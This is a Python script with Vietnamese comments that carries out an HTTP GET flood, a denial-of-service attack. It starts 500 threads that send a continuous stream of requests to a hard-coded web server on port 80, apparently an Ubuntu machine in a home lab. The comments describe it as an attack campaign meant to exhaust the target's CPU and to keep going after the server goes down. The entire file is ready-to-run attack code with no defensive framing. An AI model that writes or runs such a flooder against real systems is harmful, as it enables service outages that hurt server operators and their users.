#!/usr/bin/env python3
import socket
import threading
import time

# ==========================================
# CẤU HÌNH MỤC TIÊU
# ==========================================
target_ip = "192.168.5.130" # Đã điền sẵn IP Ubuntu của bạn
target_port = 80            # Cổng Web Server

request_count = 0

def http_flood():
    global request_count
    while True:
        try:
            # Mở kết nối TCP thật đến Server
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            
            # Nhồi lệnh tải trang web (HTTP GET) liên tục
            request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
            s.send(request.encode())
            
            request_count += 1
            if request_count % 500 == 0:
                print(f"[*] Đã nã {request_count} request HTTP GET vào Server...")
            
            s.close()
        except:
            # Nếu Server sập không kết nối được thì bỏ qua, tiếp tục nhồi
            pass

def main():
    print(f"[+] Đang khởi động chiến dịch HTTP Flood vào {target_ip}:{target_port}...")
    print(f"[+] Bắt đầu tạo 500 luồng (threads) ép xung CPU mục tiêu...")
    print("[+] Bấm Ctrl + C để dừng tấn công.\n")

    # Tạo 500 luồng chạy song song để vắt kiệt CPU
    for i in range(500):
        thread = threading.Thread(target=http_flood)
        thread.start()

if __name__ == "__main__":
    main()
